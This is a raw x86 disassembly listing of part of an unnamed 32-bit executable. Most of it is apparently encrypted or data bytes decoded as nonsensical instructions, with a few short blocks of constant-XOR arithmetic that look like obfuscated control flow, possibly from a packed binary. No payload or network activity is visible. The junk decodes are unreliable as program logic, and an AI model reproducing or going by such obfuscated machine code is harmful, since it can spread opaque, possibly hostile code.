  40bd7d:	adc    DWORD PTR [edi+edi*2+0x317be3d4],ebp
  40bd84:	icebp  
  40bd85:	fwait
  40bd86:	xchg   esi,eax
  40bd87:	mov    esi,0xae894e70
  40bd8c:	(bad)  
  40bd8d:	sahf   
  40bd8e:	mov    bh,0x66
  40bd90:	pop    ss
  40bd91:	ins    BYTE PTR es:[edi],dx
  40bd92:	int    0x1b
  40bd94:	(bad)  
  40bd95:	fcmovne st,st(4)
  40bd97:	push   edi
  40bd98:	jb     0x40bd4b
  40bd9a:	fsubr  DWORD PTR [ebx]
  40bd9c:	clc    
  40bd9d:	(bad)  
  40bd9e:	fst    st(4)
  40bda0:	jge    0x40bddf
  40bda2:	pushf  
  40bda3:	repz adc eax,0x70d95703
  40bda9:	js     0x40bd35
  40bdab:	pop    ebp
  40bdac:	call   FWORD PTR [esi-0x5ec426af]
  40bdb2:	nop
  40bdb3:	add    ah,BYTE PTR [edi*8+0x46771d74]
  40bdba:	sahf   
  40bdbb:	and    bh,bh
  40bdbd:	outs   dx,DWORD PTR ds:[esi]
  40bdbe:	xor    al,0x4e
  40bdc0:	call   0x4cca:0xb12a7350
  40bdc7:	rol    BYTE PTR [esi+edx*2],0xb4
  40bdcb:	ins    BYTE PTR es:[edi],dx
  40bdcc:	rcr    BYTE PTR [ebp-0xf],cl
  40bdcf:	sbb    al,BYTE PTR [ebx+0x421ce345]
  40bdd5:	out    dx,eax
  40bdd6:	and    eax,0xd979cff8
  40bddb:	push   ss
  40bddc:	into   
  40bddd:	cs cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bde0:	retf   
  40bde1:	push   eax
  40bde2:	aas    
  40bde3:	jno    0x40be43
  40bde5:	push   ebx
  40bde6:	stc    
  40bde7:	out    0xb8,eax
  40bde9:	fidiv  DWORD PTR [edi-0xb]
  40bdec:	mov    bh,dh
  40bdee:	(bad)  
  40bdef:	fstp   TBYTE PTR ds:0xd7353f2f
  40bdf5:	add    eax,0x377a346
  40bdfa:	or     BYTE PTR es:[edi+ebx*1-0x16fda96f],bl
  40be02:	lods   eax,DWORD PTR ds:[esi]
  40be03:	mov    ebp,0xcc7ec7e1
  40be08:	jb     0x40bddb
  40be0a:	shl    dl,cl
  40be0c:	aaa    
  40be0d:	mov    WORD PTR [ebp-0x310c1717],ss
  40be13:	push   edi
  40be14:	psubw  mm5,QWORD PTR [edi]
  40be17:	xor    al,ah
  40be19:	bound  edi,QWORD PTR [ecx-0x9]
  40be1c:	xor    BYTE PTR [edx+0x5b],cl
  40be1f:	mov    al,0x6c
  40be21:	lahf   
  40be22:	xchg   ebp,eax
  40be23:	ret    
  40be24:	rol    bl,0x44
  40be27:	mov    dh,0x50
  40be29:	mov    bh,0xf9
  40be2b:	lods   al,BYTE PTR ds:[esi]
  40be2c:	push   0xbd0ca866
  40be31:	add    DWORD PTR [ebx+0x1177ab21],0xfa2393da
  40be3b:	outs   dx,DWORD PTR ds:[esi]
  40be3c:	stos   DWORD PTR es:[edi],eax
  40be3d:	call   0xdf52:0xe50c42e7
  40be44:	pop    ebp
  40be45:	mov    al,ds:0x9a8f3a86
  40be4a:	popa   
  40be4b:	jle    0x40be2a
  40be4d:	mov    al,0x48
  40be4f:	es and al,0x2a
  40be52:	jo     0x40bdef
  40be54:	and    DWORD PTR [eax+0x1],esp
  40be57:	test   al,0x78
  40be59:	or     esp,eax
  40be5b:	mov    eax,0x5060f761
  40be60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be61:	lds    esp,FWORD PTR [ebx+edi*1-0x1e8e78f]
  40be68:	adc    eax,esi
  40be6a:	fs push edx
  40be6c:	adc    bl,al
  40be6e:	lahf   
  40be6f:	rcr    DWORD PTR [edx+0x207823fa],0x45
  40be76:	clc    
  40be77:	mov    ch,0x4
  40be79:	fwait
  40be7a:	cs cli 
  40be7c:	retf   0x4358
  40be7f:	add    BYTE PTR [eax+0x688aa55a],0xc3
  40be86:	or     DWORD PTR [ebx+0x25],esi
  40be89:	dec    ebx
  40be8a:	push   eax
  40be8b:	popa   
  40be8c:	lods   al,BYTE PTR ds:[esi]
  40be8d:	lahf   
  40be8e:	sub    eax,0x731f49be
  40be93:	jg     0x40bed7
  40be95:	aam    0xa3
  40be97:	add    BYTE PTR [ecx-0x6376b674],dh
  40be9d:	inc    esi
  40be9e:	sbb    eax,0xed904c49
  40bea3:	adc    ah,BYTE PTR [eax-0x7e71b439]
  40bea9:	inc    eax
  40beaa:	jne    0x40be59
  40beac:	stos   BYTE PTR es:[edi],al
  40bead:	sub    bl,0x18
  40beb0:	rcr    DWORD PTR [ebx],0xb0
  40beb3:	push   edx
  40beb4:	jne    0x40bee2
  40beb6:	mov    BYTE PTR [esi-0x27],bl
  40beb9:	inc    eax
  40beba:	jae    0x40be4c
  40bebc:	pop    esi
  40bebd:	gs aam 0x7d
  40bec0:	push   es
  40bec1:	xchg   ebx,eax
  40bec2:	arpl   WORD PTR [edi-0x3e],cx
  40bec5:	mov    esp,0xd1370282
  40beca:	sub    al,0x7c
  40becc:	fucomi st,st(4)
  40bece:	mov    gs,ebp
  40bed0:	xchg   esp,eax
  40bed1:	mov    bl,0x5d
  40bed3:	leave  
  40bed4:	ss push edx
  40bed6:	scas   al,BYTE PTR es:[edi]
  40bed7:	pop    edi
  40bed8:	mov    esp,ebp
  40beda:	dec    ecx
  40bedb:	inc    ebp
  40bedc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bedd:	inc    ecx
  40bede:	xor    eax,0x55218663
  40bee3:	dec    ecx
  40bee4:	into   
  40bee5:	push   ecx
  40bee6:	ret    0x5435
  40bee9:	or     BYTE PTR [ecx+0x7],dl
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x5d2ca131]
  40bf27:	outs   dx,BYTE PTR ds:[esi]
  40bf28:	cmp    cl,0x7e
  40bf2b:	jle    0x40bf65
  40bf2d:	jl     0x40bfad
  40bf2f:	jle    0x40bf57
  40bf31:	dec    eax
  40bf32:	push   ecx
  40bf33:	dec    eax
  40bf34:	rcr    BYTE PTR [ebx+0x1e],1
  40bf37:	enter  0xf26e,0xb3
  40bf3b:	xor    esp,DWORD PTR [edx]
  40bf3d:	jb     0x40bef4
  40bf3f:	imul   ah
  40bf41:	sar    DWORD PTR [edx+ecx*8+0x264af4ca],1
  40bf48:	mov    edi,0x903db763
  40bf4d:	popa   
  40bf4e:	rol    DWORD PTR [edi],cl
  40bf50:	repz loop 0x40bf5e
  40bf53:	dec    edx
  40bf54:	mov    ch,0x14
  40bf56:	or     edx,DWORD PTR [esp+ecx*4+0x2b8f19d5]
  40bf5d:	fstp   DWORD PTR [ecx+0x147e1baa]
  40bf63:	push   esi
  40bf64:	(bad)  
  40bf65:	push   ecx
  40bf66:	mov    ebx,0xa1895bc8
  40bf6b:	popf   
  40bf6c:	stc    
  40bf6d:	and    eax,0xa03d547e
  40bf72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf74:	inc    ebx
  40bf75:	jns    0x40befb
  40bf77:	jg     0x40bf04
  40bf79:	repz jmp 0xc720:0xbfc8dda8
  40bf81:	call   0x6ee5f740
  40bf86:	fild   QWORD PTR [eax-0x67cc9500]
  40bf8c:	imul   DWORD PTR [esp+ebx*2]
  40bf8f:	hlt    
  40bf90:	les    ebx,FWORD PTR [eax+0x50ffe923]
  40bf96:	loopne 0x40bfff
  40bf98:	out    dx,al
  40bf99:	pop    esp
  40bf9a:	mov    eax,0xb07690b4
  40bf9f:	lea    eax,[esi+0x6e4f619c]
  40bfa5:	inc    edi
  40bfa6:	not    DWORD PTR cs:[ebx-0x1d]
  40bfaa:	add    ebp,esp
  40bfac:	outs   dx,BYTE PTR ds:[esi]
  40bfad:	cmp    esi,ecx
  40bfaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfb0:	sbb    ebp,DWORD PTR [ebx]
  40bfb2:	pop    esi
  40bfb3:	cmp    ebp,esi
  40bfb5:	or     eax,0x87045648
  40bfba:	inc    edi
  40bfbb:	mov    ecx,0x62c2f33d
  40bfc0:	lea    esi,[ecx]
  40bfc2:	cld    
  40bfc3:	adc    dl,BYTE PTR [eax+ebx*1]
  40bfc6:	push   ss
  40bfc7:	sbb    ecx,eax
  40bfc9:	xchg   ebp,eax
  40bfca:	jg     0x40bf69
  40bfcc:	mov    eax,0xa4af06f4
  40bfd1:	or     cl,0x4a
  40bfd4:	lea    esi,[ebx+0x62]
  40bfd7:	xchg   ecx,eax
  40bfd8:	ror    DWORD PTR [eax+0x2c],cl
  40bfdb:	call   0x6819:0x58a3db29
  40bfe2:	in     al,dx
  40bfe3:	or     BYTE PTR [ecx+esi*4],dh
  40bfe6:	lds    ebp,FWORD PTR [ecx]
  40bfe8:	mov    es,WORD PTR [ebp+0x14822172]
  40bfee:	fwait
  40bfef:	and    ecx,DWORD PTR [edi+0x5e7be41d]
  40bff5:	push   edi
  40bff6:	add    cl,BYTE PTR [eax]
  40bff8:	xchg   esi,eax
  40bff9:	mov    edi,0x9a3d6020
  40bffe:	out    0x1,eax
  40c000:	xor    DWORD PTR [edx],ecx
  40c002:	outs   dx,BYTE PTR es:[esi]
  40c004:	loopne 0x40c06e
  40c006:	sbb    eax,0x55ed92ab
  40c00b:	xor    BYTE PTR [edx+0x556e0b37],0x23
  40c012:	repnz ficom DWORD PTR [ebp-0x77f59b50]
  40c019:	mov    ecx,0x77a1b78a
  40c01e:	pop    esp
  40c01f:	(bad)  
  40c020:	aaa    
  40c021:	stos   DWORD PTR es:[edi],eax
  40c022:	ja     0x40bff5
  40c024:	lods   eax,DWORD PTR ds:[esi]
  40c025:	call   0x879d:0xb9c592e8
  40c02c:	xor    bh,BYTE PTR [ebx+0x30]
  40c02f:	mov    ds,WORD PTR [edx+0x3b]
  40c032:	sahf   
  40c033:	pop    eax
  40c034:	mov    al,BYTE PTR [edx]
  40c036:	lahf   
  40c037:	pop    es
  40c038:	jg     0x40c00e
  40c03a:	xchg   esp,eax
  40c03b:	xor    eax,0x1205329c
  40c040:	and    ebp,DWORD PTR [ecx+eax*2+0x47fb72ea]
  40c047:	and    eax,0x160e1018
  40c04c:	pop    ss
  40c04d:	nop
  40c04e:	cld    
  40c04f:	xchg   ebp,eax
  40c050:	xchg   ecx,eax
  40c051:	sub    dl,cl
  40c053:	mov    edi,0x751d6956
  40c058:	loope  0x40c05a
  40c05a:	push   ebx
  40c05b:	loop   0x40c02d
  40c05d:	nop
  40c05e:	push   ebx
  40c05f:	repnz out 0x10,eax
  40c062:	xchg   ebp,eax
  40c063:	pusha  
  40c064:	or     BYTE PTR [eax],dh
  40c066:	sbb    BYTE PTR [ebp+0x70],ch
  40c069:	dec    ebx
  40c06a:	pushf  
  40c06b:	pop    esp
  40c06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c06d:	lock into 
  40c06f:	or     DWORD PTR [edi*2-0x335a7a64],ebp
  40c076:	popf   
  40c077:	push   ds
  40c078:	std    
  40c079:	sti    
  40c07a:	stc    
  40c07b:	sti    
  40c07c:	sbb    edx,esi
  40c07e:	fdivrp st(6),st
  40c080:	push   esi
  40c081:	or     eax,0xb3729e8b
  40c086:	mov    ch,0xe0
  40c088:	dec    ecx
  40c089:	cmp    al,0x3a
  40c08b:	push   ds
  40c08c:	mov    ss,WORD PTR [edi]
  40c08e:	add    eax,0x1ff84e3
  40c093:	cs out 0x6b,eax
  40c096:	clc    
  40c097:	movq   mm7,QWORD PTR [edx-0x6797abb1]
  40c09e:	mov    gs,WORD PTR [ecx+0x34fc4605]
  40c0a4:	add    edi,esp
  40c0a6:	and    BYTE PTR [eax],bh
  40c0a8:	cdq    
  40c0a9:	stos   DWORD PTR es:[edi],eax
  40c0aa:	dec    eax
  40c0ab:	int    0x81
  40c0ad:	aam    0xea
  40c0af:	jno    0x40c081
  40c0b1:	fbld   TBYTE PTR [edx+0x79d1ff72]
  40c0b7:	and    BYTE PTR [edx],bh
  40c0b9:	enter  0xc194,0xb5
  40c0bd:	mov    edi,0x9eb4fb50
  40c0c2:	mov    ?,WORD PTR [eax]
  40c0c4:	sar    DWORD PTR cs:0xbb390b89,1
  40c0cb:	sti    
  40c0cc:	scas   eax,DWORD PTR es:[edi]
  40c0cd:	loop   0x40c133
  40c0cf:	shl    BYTE PTR [edi+edi*1+0x516fa399],1
  40c0d6:	retf   0x389b
  40c0d9:	mov    ds:0x2b91c95e,eax
  40c0de:	and    BYTE PTR [ecx+ebx*8+0x5a1a65bb],ah
  40c0e5:	ins    BYTE PTR es:[edi],dx
  40c0e6:	sbb    eax,0x372ac34e
  40c0eb:	dec    esi
  40c0ec:	mov    ecx,0xd354952f
  40c0f1:	mov    ecx,0x8974063a
  40c0f6:	cmp    ah,BYTE PTR [ecx+0x5d]
  40c0f9:	sbb    cl,BYTE PTR [edx+0x33b00ef1]
  40c0ff:	enter  0x31a,0xd1
  40c103:	hlt    
  40c104:	jl     0x40c092
  40c106:	(bad)  
  40c107:	pop    edx
  40c108:	es retf 
  40c10a:	dec    ebx
  40c10b:	sbb    BYTE PTR cs:0x736a8dbc,al
  40c112:	cmp    eax,0x9f31e091
  40c117:	or     BYTE PTR [edi-0x49d049ed],ah
  40c11d:	and    eax,0x7b29c402
  40c122:	fs pop esi
  40c124:	in     eax,0x9b
  40c126:	rcl    ecx,1
  40c128:	xchg   DWORD PTR [edi],eax
  40c12a:	lahf   
  40c12b:	cmp    esp,DWORD PTR [edx]
  40c12d:	dec    ecx
  40c12e:	mov    al,0x60
  40c130:	js     0x40c11f
  40c132:	add    DWORD PTR [edi+0x21d62c9a],edx
  40c138:	fiadd  WORD PTR [ecx+0x5e]
  40c13b:	out    dx,eax
  40c13c:	jl     0x40c0e0
  40c13e:	test   eax,0x1e5b63b7
  40c143:	dec    ebp
  40c144:	popf   
  40c145:	adc    esi,DWORD PTR [ecx*8+0x1481844f]
  40c14c:	add    ch,BYTE PTR [ebx-0x13511d36]
  40c152:	fild   WORD PTR [eax+0x5d]
  40c155:	add    eax,DWORD PTR [ebx+0x52f3c93d]
  40c15b:	dec    esp
  40c15c:	out    0x13,eax
  40c15e:	xor    edx,DWORD PTR [ebx-0x2d]
  40c161:	(bad)  
  40c162:	stos   BYTE PTR es:[edi],al
  40c163:	arpl   WORD PTR [edx+0x57],dx
  40c166:	jl     0x40c159
  40c168:	inc    edx
  40c169:	jns    0x40c1b3
  40c16b:	gs (bad) 
  40c16d:	fs sub al,0xef
  40c170:	nop
  40c171:	pop    es
  40c172:	pop    edi
  40c173:	pop    edi
  40c174:	mov    cl,0x33
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0x3a
  40c196:	add    DWORD PTR [esi+0x7e874a35],eax
  40c19c:	jle    0x40c1d6
  40c19e:	jl     0x40c21e
  40c1a0:	jle    0x40c1d9
  40c1a2:	xor    al,0xe8
  40c1a4:	lea    edi,[edx+0x1df14a4b]
  40c1aa:	fdiv   DWORD PTR [edi-0x3278377f]
  40c1b0:	dec    esi
  40c1b1:	mov    cl,0x4a
  40c1b3:	pop    esi
  40c1b4:	addr16 enter 0x8913,0xb8
  40c1b9:	(bad)  
  40c1bb:	push   esp
  40c1bc:	pop    ecx
  40c1bd:	(bad)  
  40c1be:	jp     0x40c1a2
  40c1c0:	jl     0x40c15c
  40c1c2:	shl    esi,cl
  40c1c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1c6:	sub    DWORD PTR [esi+0x18d13e26],0x5f
  40c1cd:	and    eax,0x8263de7
  40c1d2:	dec    edi
  40c1d3:	cmp    BYTE PTR [ebx-0x4],dl
  40c1d6:	dec    ebx
  40c1d7:	fsubr  st(5),st
  40c1d9:	loopne 0x40c172
  40c1db:	es cli 
  40c1dd:	retf   0xaf8b
  40c1e0:	js     0x40c1b1
  40c1e2:	mov    ah,BYTE PTR [edx-0x168d86c6]
  40c1e8:	and    al,ch
  40c1ea:	inc    ecx
  40c1eb:	cli    
  40c1ec:	adc    eax,0x8f6798ca
  40c1f1:	test   bh,0xd4
  40c1f4:	adc    dl,BYTE PTR [ebx-0x198ff3b]
  40c1fa:	sbb    ch,BYTE PTR [edi]
  40c1fc:	fldenv [edx+esi*8-0x148c538d]
  40c203:	push   es
  40c204:	std    
  40c205:	rol    DWORD PTR [ebx-0xc84879b],cl
  40c20b:	mov    ch,0x62
  40c20d:	add    eax,0x3c56d0d6
  40c212:	adc    DWORD PTR [ebx+edi*4],eax
  40c215:	xchg   edi,eax
  40c216:	into   
  40c217:	or     eax,DWORD PTR cs:[ebx+0x42fe3af5]
  40c21e:	arpl   WORD PTR [ecx-0x79fd4c2c],di
  40c224:	nop
  40c225:	jne    0x40c1e8
  40c227:	adc    BYTE PTR [edi-0x42],ah
  40c22a:	imul   edi,DWORD PTR gs:[esp+ebx*2],0x55c29e33
  40c232:	nop
  40c233:	inc    edi
  40c234:	in     eax,dx
  40c235:	jne    0x40c1fe
  40c237:	and    esi,edi
  40c239:	(bad)  
  40c23a:	bound  ebx,QWORD PTR [ebx-0x28]
  40c23d:	loope  0x40c291
  40c23f:	iret   
  40c240:	adc    ch,ch
  40c242:	jns    0x40c23f
  40c244:	scas   al,BYTE PTR es:[edi]
  40c245:	fistp  DWORD PTR [edx-0xbf162dc]
  40c24b:	enter  0xb065,0x14
  40c24f:	pop    ecx
  40c250:	jl     0x40c292
  40c252:	loope  0x40c278
  40c254:	loopne 0x40c29a
  40c256:	sub    edx,ebx
  40c258:	stos   BYTE PTR es:[edi],al
  40c259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c25a:	fimul  DWORD PTR [ecx]
  40c25c:	(bad)  
  40c25e:	push   eax
  40c25f:	leave  
  40c260:	out    0x15,al
  40c262:	push   0x58b67602
  40c267:	jmp    0x40c25d
  40c269:	adc    eax,0xd3072601
  40c26e:	jbe    0x40c225
  40c270:	sbb    DWORD PTR [edx],0x3869302d
  40c276:	rcl    DWORD PTR [ebx-0x683963b1],cl
  40c27c:	jmp    0x51bc:0x4ae520c7
  40c283:	sub    DWORD PTR [esi+0x37a38bb9],eax
  40c289:	mov    edx,0xccc8e0e9
  40c28e:	push   0x40
  40c290:	bound  ecx,QWORD PTR [ebp+ecx*2+0x17]
  40c294:	loop   0x40c306
  40c296:	lods   eax,DWORD PTR ds:[esi]
  40c297:	adc    BYTE PTR [ecx+0x28],bh
  40c29a:	jo     0x40c2c0
  40c29c:	repz (bad) 
  40c29e:	icebp  
  40c29f:	xchg   DWORD PTR [ebx+0xd],edx
  40c2a2:	lahf   
  40c2a3:	xchg   esp,eax
  40c2a4:	push   0xf04b4f25
  40c2a9:	pop    edx
  40c2aa:	cld    
  40c2ab:	ja     0x40c231
  40c2ad:	sar    BYTE PTR [edi+ecx*1+0x4430a4bc],cl
  40c2b4:	sbb    al,0x4e
  40c2b6:	jne    0x40c268
  40c2b8:	sub    dh,BYTE PTR [edi]
  40c2ba:	xor    ecx,esp
  40c2bc:	das    
  40c2bd:	xchg   DWORD PTR ds:0xc6006372,esp
  40c2c3:	adc    ch,dh
  40c2c5:	jle    0x40c2fe
  40c2c7:	cmp    eax,0xeaf98637
  40c2cc:	in     al,dx
  40c2cd:	data16 mov dh,0x7d
  40c2d0:	and    cl,al
  40c2d2:	shl    BYTE PTR [edi],0xb0
  40c2d5:	mov    ch,BYTE PTR ds:0x7d47630b
  40c2db:	pusha  
  40c2dc:	xchg   DWORD PTR [edi-0x673c27fc],ebx
  40c2e2:	in     al,dx
  40c2e3:	xchg   edi,eax
  40c2e4:	cmp    ch,al
  40c2e6:	sahf   
  40c2e7:	inc    ecx
  40c2e8:	mov    ebx,0xce6f0b5a
  40c2ed:	stos   DWORD PTR es:[edi],eax
  40c2ee:	jmp    0x40c2bf
  40c2f0:	rcr    BYTE PTR [eax+0x15],1
  40c2f3:	aam    0x5f
  40c2f5:	fidiv  DWORD PTR [ecx+edx*1]
  40c2f8:	pop    ebp
  40c2f9:	jmp    0x40c31d
  40c2fb:	mov    esi,ss
  40c2fd:	or     bl,cl
  40c2ff:	xor    eax,0xfc0ff7bb
  40c304:	movd   mm3,DWORD PTR ss:[edi+0x58]
  40c309:	xchg   edx,eax
  40c30a:	or     bh,al
  40c30c:	cmp    ebp,ecx
  40c30e:	call   0x395fa705
  40c313:	push   ds
  40c314:	jae    0x40c342
  40c316:	cmp    ch,bh
  40c318:	cmp    esi,esi
  40c31a:	adc    DWORD PTR [ebp+0x6a],0xffffffb6
  40c31e:	cmc    
  40c31f:	add    DWORD PTR [ebx+0x5c],ebp
  40c322:	inc    ebp
  40c323:	jmp    0x40c319
  40c325:	pusha  
  40c326:	pop    ds
  40c327:	fnsave [edx]
  40c329:	jae    0x40c372
  40c32b:	ror    BYTE PTR [ecx-0x4d],0xe
  40c32f:	aad    0x99
  40c331:	adc    eax,0x5e2c7c88
  40c336:	ret    0x943f
  40c339:	xchg   ecx,eax
  40c33a:	gs and ah,cl
  40c33d:	sbb    eax,DWORD PTR [edi-0x8d47d77]
  40c343:	push   ecx
  40c344:	mov    ds:0xa577befe,al
  40c349:	inc    ecx
  40c34a:	mov    eax,0x589bc0
  40c34f:	les    ebx,FWORD PTR [edi-0x6c]
  40c352:	imul   edx,DWORD PTR [ecx+edx*2+0x38],0x53
  40c357:	fwait
  40c358:	ins    DWORD PTR es:[edi],dx
  40c359:	loop   0x40c2fd
  40c35b:	ret    0xaab6
  40c35e:	scas   al,BYTE PTR es:[edi]
  40c35f:	shl    DWORD PTR [ecx-0x26e555e8],cl
  40c365:	bound  ebx,QWORD PTR [ebx+edx*4+0x51d0ec98]
  40c36c:	cdq    
  40c36d:	shr    BYTE PTR [ebp-0x38a55781],cl
  40c373:	repz xor al,al
  40c376:	inc    esi
  40c377:	nop
  40c378:	or     al,0xd0
  40c37a:	jne    0x40c3ca
  40c37c:	scas   al,BYTE PTR es:[edi]
  40c37d:	mov    BYTE PTR [edx-0x39],al
  40c380:	sub    ebx,DWORD PTR [eax]
  40c382:	repnz mov dl,0x68
  40c385:	shl    BYTE PTR [eax],cl
  40c387:	dec    eax
  40c388:	nop
  40c389:	jno    0x40c3a1
  40c38b:	pop    ds
  40c38c:	push   es
  40c38d:	stos   BYTE PTR es:[edi],al
  40c38e:	retfw  
  40c390:	call   0x44908f2e
  40c395:	ror    DWORD PTR [eax],1
  40c397:	mov    ah,BYTE PTR [edi]
  40c399:	not    DWORD PTR [esi+ebp*4]
  40c39c:	dec    eax
  40c39d:	or     al,BYTE PTR [esi-0x62d8d208]
  40c3a3:	div    BYTE PTR [ebx+esi*2]
  40c3a6:	into   
  40c3a7:	aaa    
  40c3a8:	fwait
  40c3a9:	xchg   edi,eax
  40c3aa:	cmp    ecx,DWORD PTR [eax+0x55]
  40c3ad:	icebp  
  40c3ae:	jne    0x40c39d
  40c3b0:	or     al,0xea
  40c3b2:	into   
  40c3b3:	xchg   ecx,eax
  40c3b4:	stos   BYTE PTR es:[edi],al
  40c3b5:	into   
  40c3b6:	sar    BYTE PTR [ebp+0x4f],1
  40c3b9:	bound  ecx,QWORD PTR [ebx-0x46363f23]
  40c3bf:	xchg   edx,eax
  40c3c0:	dec    eax
  40c3c1:	sti    
  40c3c2:	adc    edx,DWORD PTR [edx-0x28c79b0]
  40c3c8:	psubw  mm7,QWORD PTR [esi+edi*2-0x2b]
  40c3cd:	add    BYTE PTR [edi],al
  40c3cf:	adc    al,0xe0
  40c3d1:	outs   dx,DWORD PTR ds:[esi]
  40c3d2:	adc    esi,edx
  40c3d4:	jne    0x40c422
  40c3d6:	repz inc ecx
  40c3d8:	mov    eax,ds:0x7cfa8ac6
  40c3dd:	data16 jp 0x40c3b4
  40c3e0:	xchg   bh,al
  40c3e2:	mov    al,ds:0xe71d2e2b
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rcr    DWORD PTR [eax],cl
  40c447:	mov    bl,0x8e
  40c449:	(bad)  
  40c44a:	adc    al,0x82
  40c44c:	jle    0x40c4cc
  40c44e:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c452:	mov    DWORD PTR [ebp-0x41],esp
  40c455:	arpl   WORD PTR [ecx],ax
  40c457:	popa   
  40c458:	pushf  
  40c459:	and    DWORD PTR [edi],esi
  40c45b:	out    0x85,al
  40c45d:	pop    edi
  40c45e:	das    
  40c45f:	pop    ebp
  40c460:	test   eax,0x2e635947
  40c465:	icebp  
  40c466:	es inc ecx
  40c468:	lods   al,BYTE PTR ds:[esi]
  40c469:	push   ecx
  40c46a:	pop    es
  40c46b:	xchg   ecx,eax
  40c46c:	inc    ecx
  40c46d:	jl     0x40c498
  40c46f:	ss jge 0x40c4d9
  40c472:	or     al,BYTE PTR [ecx+0x75bfa118]
  40c478:	mov    dh,0xd3
  40c47a:	imul   ebp,DWORD PTR ds:0xd9e18e7e,0x937767e5
  40c484:	pop    esi
  40c485:	dec    edi
  40c486:	lods   al,BYTE PTR ds:[esi]
  40c487:	and    eax,0xaad7763d
  40c48c:	dec    ecx
  40c48d:	mov    ebp,edi
  40c48f:	aad    0x6e
  40c491:	loopne 0x40c4f4
  40c493:	xor    al,0xfb
  40c495:	mov    bl,0x52
  40c497:	push   edx
  40c498:	(bad)  
  40c499:	iret   
  40c49a:	inc    DWORD PTR [edx]
  40c49c:	mov    BYTE PTR [edi],dh
  40c49e:	dec    ecx
  40c49f:	outs   dx,DWORD PTR ds:[esi]
  40c4a0:	mov    ebp,0x371ea6fc
  40c4a5:	mov    ds:0x8b7cbdf6,al
  40c4aa:	jp     0x40c468
  40c4ac:	(bad)  
  40c4ad:	sbb    al,0x81
  40c4af:	pop    esi
  40c4b0:	dec    edi
  40c4b1:	xor    dl,BYTE PTR [eax-0x6b]
  40c4b4:	push   0xaef69a0b
  40c4b9:	out    dx,eax
  40c4ba:	inc    eax
  40c4bb:	cdq    
  40c4bc:	mov    al,0x70
  40c4be:	repz daa 
  40c4c0:	dec    edx
  40c4c1:	push   edx
  40c4c2:	mov    cl,0x4b
  40c4c4:	mov    WORD PTR [edx],fs
  40c4c6:	pusha  
  40c4c7:	fisub  DWORD PTR [edx+0x17]
  40c4ca:	push   0xa31bc1d1
  40c4cf:	fdiv   st(1),st
  40c4d1:	xor    eax,0xb44bec83
  40c4d6:	dec    edx
  40c4d7:	sbb    DWORD PTR [esi],eax
  40c4d9:	lods   al,BYTE PTR ds:[esi]
  40c4da:	fwait
  40c4db:	leave  
  40c4dc:	lahf   
  40c4dd:	push   ebp
  40c4de:	int    0xa0
  40c4e0:	out    0xd9,eax
  40c4e2:	inc    esi
  40c4e4:	mov    cl,0xe8
  40c4e6:	stos   BYTE PTR es:[edi],al
  40c4e7:	or     ebx,ebp
  40c4e9:	lahf   
  40c4ea:	push   ebp
  40c4eb:	stc    
  40c4ec:	gs jge 0x40c49b
  40c4ef:	add    eax,0xb209f41a
  40c4f4:	shr    BYTE PTR [ecx-0x2424304],1
  40c4fa:	cmp    BYTE PTR [eax],al
  40c4fc:	test   al,0xd7
  40c4fe:	mov    cs,WORD PTR [ebp+0x7]
